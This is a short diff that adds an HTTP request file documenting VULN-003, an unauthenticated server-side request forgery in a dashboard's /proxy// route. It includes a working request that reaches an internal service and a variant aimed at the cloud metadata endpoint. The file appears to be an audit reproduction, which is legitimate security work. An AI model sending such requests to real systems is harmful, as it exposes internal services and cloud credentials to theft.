@@ -1,0 +1,9 @@
+### VULN-003 — Unauthenticated SSRF via dashboard /proxy//<host>
+### No Cookie / Authorization header — the /proxy/* forwarding branch precedes auth.
+
+GET http://localhost:21526/proxy//api:3081/ HTTP/1.1
+Host: localhost:21526
+
+### Effect: the dashboard's Node server fetches http://api:3081/ (internal compose
+### hostname) and returns its body. Swap the host to reach other internal services
+### or, on a cloud VM, GET http://localhost:21526/proxy//169.254.169.254/latest/meta-data/
